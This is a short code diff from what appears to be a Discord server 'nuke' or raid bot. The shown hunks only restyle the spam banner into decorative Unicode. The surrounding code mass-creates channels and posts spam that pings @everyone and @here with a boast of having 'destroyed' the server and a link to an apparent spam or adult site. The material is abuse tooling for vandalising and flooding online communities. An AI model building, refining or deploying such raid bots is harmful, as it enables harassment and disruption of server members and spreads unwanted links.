@@ -292,7 +292,7 @@ async def execute_nuke(guild):
         created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – HOT WAR BOT ●'◡'●)\n"
+            "# 𝔇𝔈𝔗ℜ𝔒𝔜𝔈𝔇 𝔅𝔜 𝔅𝔒𝔖𝔖 𝔅Ả𝔒 Đℨ 𝔄𝔑𝔇 𝔊̴𝔊̶.̴𝔎̶ℨ̶3̸𝔑̵/̵𝔎̵ℨ̶4̸𝔑̷ – ℌ𝔒𝔗 𝔚𝔄ℜ 𝔅𝔒𝔗 ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
@@ -691,7 +691,7 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – HOT WAR BOT(●'◡'●)\n"
+            "# 𝔇𝔈𝔗ℜ𝔒𝔜𝔈𝔇 𝔅𝔜 𝔅𝔒𝔖𝔖 𝔅Ả𝔒 Đℨ 𝔄𝔑𝔇 𝔊̴𝔊̶.̴𝔎̶ℨ̶3̸𝔑̵/̵𝔎̵ℨ̶4̸𝔑̷ – ℌ𝔒𝔗 𝔚𝔄ℜ 𝔅𝔒𝔗(●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
